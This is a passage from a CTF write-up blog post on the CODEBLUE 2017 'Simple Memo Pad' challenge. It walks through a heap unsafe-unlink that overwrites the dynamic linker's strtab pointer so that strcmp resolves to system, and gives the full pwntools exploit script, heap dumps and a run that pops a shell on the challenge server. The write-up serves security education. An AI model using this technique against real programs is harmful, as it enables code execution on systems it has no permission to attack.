+   0x7fb65fe4fbda &lt;_dl_fixup+10&gt;: sub    rsp,0x10
+   0x7fb65fe4fbde &lt;_dl_fixup+14&gt;: mov    rax,QWORD PTR [rdi+0x68]
+   0x7fb65fe4fbe2 &lt;_dl_fixup+18&gt;: mov    rdi,QWORD PTR [rax+0x8]
+=&gt; 0x7fb65fe4fbe6 &lt;_dl_fixup+22&gt;: mov    rax,QWORD PTR [r10+0xf8]
+   0x7fb65fe4fbed &lt;_dl_fixup+29&gt;: mov    rax,QWORD PTR [rax+0x8]
+   0x7fb65fe4fbf1 &lt;_dl_fixup+33&gt;: lea    r8,[rax+rdx*8]
+   0x7fb65fe4fbf5 &lt;_dl_fixup+37&gt;: mov    rax,QWORD PTR [r10+0x70]
+   0x7fb65fe4fbf9 &lt;_dl_fixup+41&gt;: mov    rcx,QWORD PTR [r8+0x8]
+
+72      = (const void *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);</code></pre></figure>
+
+<p>Soooo, <code class="language-plaintext highlighter-rouge">0x601850 + 0x8</code> is an address in the bss, and since the binary doesn’t have <code class="language-plaintext highlighter-rouge">PIE</code>, it’s fixed.</p>
+
+<p>This means, we could use our precious overwrite from <code class="language-plaintext highlighter-rouge">unsafe unlink</code> to overwrite the address of <code class="language-plaintext highlighter-rouge">strtab</code> with our chunk pointer.</p>
+
+<p>By this, we could pass <code class="language-plaintext highlighter-rouge">_dl_fixup</code> a fake strtab, and just exchange the name of the symbol, that currently gets resolved with <code class="language-plaintext highlighter-rouge">system</code> and</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope, version, ELF_RTYPE_CLASS_PLT, flags, NULL);</code></pre></figure>
+
+<p>would give us the resolved address of <code class="language-plaintext highlighter-rouge">system</code> instead.</p>
+
+<p>We’ll need</p>
+
+<ul>
+  <li>a symbol, that’s not already resolved</li>
+  <li>that preferrably gets called with a parameter, which we control</li>
+  <li>prepare a fake <code class="language-plaintext highlighter-rouge">strtab</code> with <code class="language-plaintext highlighter-rouge">system</code> at the position, where the real symbol name would be</li>
+</ul>
+
+<p>When we’re trying to exit the application, it will ask us, if we’re really sure and then use <code class="language-plaintext highlighter-rouge">strcmp (&amp;input, "y")</code>  to check our answer. Since this won’t be called, until we try to exit, <code class="language-plaintext highlighter-rouge">strcmp</code> won’t be resolved yet, and we also control the first parameter. Perfect :)</p>
+
+<p>So we’ll just create a fake <code class="language-plaintext highlighter-rouge">strtab</code>, place <code class="language-plaintext highlighter-rouge">system</code> at the offset, where <code class="language-plaintext highlighter-rouge">strcmp</code> is stored in the original <code class="language-plaintext highlighter-rouge">strtab</code> and put it in a note chunk.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1">#!/usr/bin/python
+</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+
+<span class="n">LOCAL</span> <span class="o">=</span> <span class="bp">True</span>
+
+<span class="n">HOST</span> <span class="o">=</span> <span class="s">"memopad.tasks.ctf.codeblue.jp"</span>
+<span class="n">PORT</span> <span class="o">=</span> <span class="mi">5498</span>
+
+<span class="k">def</span> <span class="nf">write_note</span><span class="p">(</span><span class="n">content</span><span class="p">):</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"1"</span><span class="p">)</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"Content: "</span><span class="p">,</span> <span class="n">content</span><span class="p">)</span>    
+    <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">edit_note</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="n">content</span><span class="p">,</span> <span class="n">usenl</span><span class="o">=</span><span class="bp">True</span><span class="p">):</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"2"</span><span class="p">)</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"Index: "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"Content: "</span><span class="p">,</span> <span class="n">content</span><span class="p">)</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">del_note</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="n">usenl</span><span class="o">=</span><span class="bp">True</span><span class="p">):</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"3"</span><span class="p">)</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"Index: "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">quit</span><span class="p">(</span><span class="n">answer</span><span class="p">):</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"5"</span><span class="p">)</span>
+
+    <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"(y/n)"</span><span class="p">,</span> <span class="n">answer</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">r</span><span class="p">):</span>
+    <span class="n">e</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./simple_memo_pad"</span><span class="p">)</span>
+    
+    <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">)</span>
+
+    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Create fake note for str tab"</span><span class="p">)</span>
+
+    <span class="n">payload</span> <span class="o">=</span> <span class="s">"A"</span> <span class="o">*</span> <span class="mi">83</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="s">"system"</span>
+
+    <span class="n">write_note</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+    <span class="n">r</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+
+    <span class="k">return</span>
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
+    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">:</span>
+        <span class="n">LOCAL</span> <span class="o">=</span> <span class="bp">False</span>
+        <span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>
+        <span class="n">exploit</span><span class="p">(</span><span class="n">r</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">LOCAL</span> <span class="o">=</span> <span class="bp">True</span>
+        <span class="n">r</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">"./simple_memo_pad"</span><span class="p">)</span>
+        <span class="k">print</span> <span class="n">util</span><span class="p">.</span><span class="n">proc</span><span class="p">.</span><span class="n">pidof</span><span class="p">(</span><span class="n">r</span><span class="p">)</span>
+        <span class="n">pause</span><span class="p">()</span>
+        <span class="n">exploit</span><span class="p">(</span><span class="n">r</span><span class="p">)</span></code></pre></figure>
+
+<p>The heap will look like this:</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">0x60c0b0: 0x0000000000000000  0x00000000000000b1
+0x60c0c0: 0xc355eb8d42c90e00  0x0000000100000002    &lt;= Note chunk 2
+0x60c0d0: 0x4141414141414141  0x4141414141414141
+0x60c0e0: 0x4141414141414141  0x4141414141414141
+0x60c0f0: 0x4141414141414141  0x4141414141414141
+0x60c100: 0x4141414141414141  0x4141414141414141
+0x60c110: 0x4141414141414141  0x4141414141414141
+0x60c120: 0x6574737973414141  0x000000000000006d    &lt;= "system" string
+0x60c130: 0x0000000000000000  0x0000000000000000
+0x60c140: 0x0000000000000000  0x0000000000000000
+0x60c150: 0x000000000060c170  0x000000000060c010
+0x60c160: 0x0000000000000000  0x00000000000000b1
+0x60c170: 0xc355eb8d42c90e00  0x0000000000000003    &lt;= Note chunk 3
+0x60c180: 0x0000000000000000  0x0000000000000000
+0x60c190: 0x0000000000000000  0x0000000000000000
+0x60c1a0: 0x0000000000000000  0x0000000000000000
+0x60c1b0: 0x0000000000000000  0x0000000000000000
+0x60c1c0: 0x0000000000000000  0x0000000000000000
+0x60c1d0: 0x0000000000000000  0x0000000000000000
+0x60c1e0: 0x0000000000000000  0x0000000000000000
+0x60c1f0: 0x0000000000000000  0x0000000000000000
+0x60c200: 0x000000000060c220  0x000000000060c0c0    &lt;= Next / Prev pointer</code></pre></figure>
+
+<p>The <code class="language-plaintext highlighter-rouge">Prev</code> pointer of chunk 3 points to our fake <code class="language-plaintext highlighter-rouge">strtab</code>. We can now use the overflow in <code class="language-plaintext highlighter-rouge">editNote</code> to overwrite the <code class="language-plaintext highlighter-rouge">Next</code> pointer to define, where we want to write the value from <code class="language-plaintext highlighter-rouge">Prev</code>.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Create another note for unsafe unlink"</span><span class="p">)</span>
+<span class="n">write_note</span><span class="p">(</span><span class="s">"A"</span> <span class="o">*</span> <span class="mi">128</span><span class="p">)</span>
+
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Overwrite FD pointer of the 3rd chunk with pointer to STRTAB"</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="s">"A"</span> <span class="o">*</span> <span class="mi">128</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x601858</span> <span class="o">-</span> <span class="mh">0x98</span><span class="p">)</span>
+
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Unlink to overwrite STRTAB address with chunk 2 address"</span><span class="p">)</span>
+<span class="n">edit_note</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span></code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">0x60c0b0: 0x0000000000000000  0x00000000000000b1
+0x60c0c0: 0xc355eb8d42c90e00  0x0000000100000002  &lt;= Note chunk 2
+0x60c0d0: 0x4141414141414141  0x4141414141414141
+0x60c0e0: 0x4141414141414141  0x4141414141414141
+0x60c0f0: 0x4141414141414141  0x4141414141414141
+0x60c100: 0x4141414141414141  0x4141414141414141
+0x60c110: 0x4141414141414141  0x4141414141414141
+0x60c120: 0x6574737973414141  0x000000000000006d  &lt;= "system" string
+0x60c130: 0x0000000000000000  0x0000000000000000
+0x60c140: 0x0000000000000000  0x0000000000000000
+0x60c150: 0x00000000006017c0  0x000000000060c010
+0x60c160: 0x0000000000000000  0x00000000000000b1
+0x60c170: 0xc355eb8d42c90e00  0x0000000100000003  &lt;= Note chunk 3
+0x60c180: 0x4141414141414141  0x4141414141414141
+0x60c190: 0x4141414141414141  0x4141414141414141
+0x60c1a0: 0x4141414141414141  0x4141414141414141
+0x60c1b0: 0x4141414141414141  0x4141414141414141
+0x60c1c0: 0x4141414141414141  0x4141414141414141
+0x60c1d0: 0x4141414141414141  0x4141414141414141
+0x60c1e0: 0x4141414141414141  0x4141414141414141
+0x60c1f0: 0x4141414141414141  0x4141414141414141
+0x60c200: 0x00000000006017c0  0x000000000060c0c0  &lt;= Next (pointing to strtab - 0x98) / Prev</code></pre></figure>
+
+<p>Then we’ll use the <code class="language-plaintext highlighter-rouge">unsafe unlink</code> in <code class="language-plaintext highlighter-rouge">deleteNote</code> to overwrite <code class="language-plaintext highlighter-rouge">0x601858</code> with the <code class="language-plaintext highlighter-rouge">Prev</code> pointer from our chunk</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">del_note</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span></code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">x/gx 0x601858
+0x601858: 0x000000000060c0c0</code></pre></figure>
+
+<p>With this setup, <code class="language-plaintext highlighter-rouge">_dl_fixup</code> will now use <code class="language-plaintext highlighter-rouge">0x60c0c0</code> instead of <code class="language-plaintext highlighter-rouge">0x400418</code> (original <code class="language-plaintext highlighter-rouge">strtab</code>) for finding the symbol name to resolve. Since we put <code class="language-plaintext highlighter-rouge">system</code> at the position of <code class="language-plaintext highlighter-rouge">strcmp</code>, <code class="language-plaintext highlighter-rouge">_dl_lookup_symbol_x</code> will now happily serve us the address of <code class="language-plaintext highlighter-rouge">system</code> instead.</p>
+
+<p>So, all there’s left to do is, to exit the application and tell it that we’re <code class="language-plaintext highlighter-rouge">'/bin/sh'</code> sure, that we want to exit.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Exit with '/bin/sh' to resolve strcmp as system"</span><span class="p">)</span>
+<span class="n">quit</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">)</span></code></pre></figure>
+
+<p>Quick check in gdb:</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">[----------------------------------registers-----------------------------------]
+RAX: 0x1 
+RBX: 0x601a08 --&gt; 0x400766 (&lt;strcmp@plt+6&gt;: push   0x9)
+RCX: 0x7f80d82ba4c8 --&gt; 0x7f80d82ba428 --&gt; 0x7f80d82b69c8 --&gt; 0x7f80d82ba170 --&gt; 0x0 
+RDX: 0x7ffdf7fbc8a8 --&gt; 0x400370 --&gt; 0x1200000063 
+RSI: 0x7f80d82ba170 --&gt; 0x0 
+RDI: 0x60c123 --&gt; 0x6d6574737973 ('system')                   # symbol name from our fake strtab
+RBP: 0x7ffdf7fbca20 --&gt; 0x401190 (push   r15)
+RSP: 0x7ffdf7fbc890 --&gt; 0x1 
+RIP: 0x7f80d80a3c9f (&lt;_dl_fixup+207&gt;: call   0x7f80d809ef70 &lt;_dl_lookup_symbol_x&gt;)
+R8 : 0x7f80d82b6a10 --&gt; 0x4004b3 ("GLIBC_2.2.5")
+R9 : 0x1 
+R10: 0x7f80d82ba170 --&gt; 0x0 
+R11: 0x246 
+R12: 0x4007d0 (xor    ebp,ebp)
+R13: 0x7ffdf7fbcb00 --&gt; 0x1 
+R14: 0x0 
+R15: 0x0
+EFLAGS: 0x206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x7f80d80a3c93 &lt;_dl_fixup+195&gt;:  mov    r9d,0x1
+   0x7f80d80a3c99 &lt;_dl_fixup+201&gt;:  add    rdi,rsi
+   0x7f80d80a3c9c &lt;_dl_fixup+204&gt;:  mov    rsi,r10
+=&gt; 0x7f80d80a3c9f &lt;_dl_fixup+207&gt;:  call   0x7f80d809ef70 &lt;_dl_lookup_symbol_x&gt;
+   0x7f80d80a3ca4 &lt;_dl_fixup+212&gt;:  mov    r8,rax
+   0x7f80d80a3ca7 &lt;_dl_fixup+215&gt;:  mov    eax,DWORD PTR fs:0x18
+   0x7f80d80a3caf &lt;_dl_fixup+223&gt;:  test   eax,eax
+   0x7f80d80a3cb1 &lt;_dl_fixup+225&gt;:  pop    rcx
+Guessed arguments:
+arg[0]: 0x60c123 --&gt; 0x6d6574737973 ('system')
+arg[1]: 0x7f80d82ba170 --&gt; 0x0 
+arg[2]: 0x7ffdf7fbc8a8 --&gt; 0x400370 --&gt; 0x1200000063 
+arg[3]: 0x7f80d82ba4c8 --&gt; 0x7f80d82ba428 --&gt; 0x7f80d82b69c8 --&gt; 0x7f80d82ba170 --&gt; 0x0 
+
+111       result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,</code></pre></figure>
+
+<p>Everything looks fine, resolving <code class="language-plaintext highlighter-rouge">system</code> here, and:</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">$ python xpl.py 1
+[+] Opening connection to memopad.tasks.ctf.codeblue.jp on port 5498: Done
+[*] '/home/kileak/pwn/Challenges/codeblue/simple_memo/simple_memo_pad/simple_memo_pad'
+    Arch:     amd64-64-little
+    RELRO:    No RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+[*] Create fake entry for str tab
+[*] Create another note for unsafe unlink
+[*] Overwrite FD pointer of the 3rd chunk with pointer to STRTAB
+[*] Unlink to overwrite STRTAB address with chunk 2 address
+[*] Exit with '/bin/sh' to resolve strcmp as system
+[*] Switching to interactive mode
+: $ cat flag
+CBCTF{A11_y0ur_5tRtaB_are_beL0nG_tO_uS}</code></pre></figure>
+
+
+    <aside class="share">
+
+      <span>Share this: </span>
+
+      <a href="http://twitter.com/share?text=CODEBLUE CTF 2017 - Simple Memo Pad&amp;url=https://kileak.github.io/ctf/2017/CODEBLUE-SimpleMemoPad/"
+      onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+        <i class="icon icon-twitter-rounded"></i>
+      </a>
+
+      <a href="https://www.facebook.com/sharer/sharer.php?u=https://kileak.github.io/ctf/2017/CODEBLUE-SimpleMemoPad/"
+      onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
+        <i class="icon icon-facebook-rounded"></i>
+      </a>
+
+    </aside>
+  </div>
+
+  
+  <hr>
+  <aside id="comments" class="disqus">
+    <div class="container">
+      <h3><i class="icon icon-comments-o"></i> Comments</h3>
+      <div id="disqus_thread"></div>
+
+      <script type="text/javascript">
+        var disqus_shortname = 'kileak';
+        var disqus_identifier = '/ctf/2017/CODEBLUE-SimpleMemoPad';
+        var disqus_title = 'CODEBLUE CTF 2017 - Simple Memo Pad';
+        var disqus_url = 'https://kileak.github.io/ctf/2017/CODEBLUE-SimpleMemoPad';
+
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+      </script>
+
+      <noscript>
+        Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a>
+      </noscript>
+    </div>
+  </aside>
+
+
+
+</article>
+
+        </section>
+
+        
+<div class="clearfix"></div>
+
+<footer class="site-footer txt-center">
+  <hr>
+
+  <ul class="social">
+    
+  </ul>
+
+  <small>&copy; 2025 All rights reserved. Made with <a href="http://jekyllrb.com" target="_blank">Jekyll</a> and <i class="icon icon-heart"></i></small>
+  <small>by <a href="http://nandomoreira.me" target="_blank">nandomoreira.me</a></small>
+
+</footer>
+
+
+    </main>
+
+    <a href="http://github.com/Kileak" target="_blank" class="github-corner"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#000; color:#fff; position: absolute; top: 0; border: 0; right: 0;"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+    <script src="/js/jquery.min.js"></script>
+    <script src="/js/jekyll-search.min.js"></script>
+    <script src="/js/main.js"></script>
+  </body>
+</html>
